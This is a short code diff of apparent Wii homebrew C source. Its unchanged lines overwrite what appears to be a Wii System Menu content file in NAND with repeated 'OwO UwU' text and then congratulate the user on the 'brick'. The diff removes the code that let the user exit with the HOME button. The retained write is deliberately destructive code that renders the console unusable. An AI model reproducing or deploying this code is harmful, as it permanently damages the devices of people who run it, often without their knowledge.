@@ -46,12 +46,5 @@ int main(int argc, char **argv) {
 		printf("\n\tCorrupting /title/00000001/00000002/content/0000009a.app...");
 		NAND_WriteFile("/title/00000001/00000002/content/0000009a.app", "OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO");
 		printf("\n\n\tDone! Enjoy your brick! UwU");
-		
-		// Just press HOME to retrurn your fucked Wii!
-		
-		WPAD_ScanPads();
-        u32 pressed = WPAD_ButtonsDown(0);
-        if (pressed & WPAD_BUTTON_HOME) exit(0);
-        VIDEO_WaitVSync();
 	}
 }
